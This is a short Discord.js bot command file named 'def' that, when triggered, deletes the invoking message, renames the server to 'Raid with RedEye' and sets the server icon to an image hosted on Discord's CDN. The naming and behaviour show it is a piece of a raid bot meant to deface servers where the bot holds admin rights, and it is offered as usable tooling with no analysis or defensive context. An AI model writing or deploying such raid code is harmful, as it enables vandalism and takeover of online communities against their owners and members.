const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js");

module.exports = {
    name: "def",
    run: async (client, message, args) => {
        if (message.deletable) message.delete();
                            message.guild.setName('Raid with RedEye')
                            message.guild.setIcon('https://cdn.discordapp.com/attachments/931509592578482196/996778033740521564/redeye.png')
        
    }
}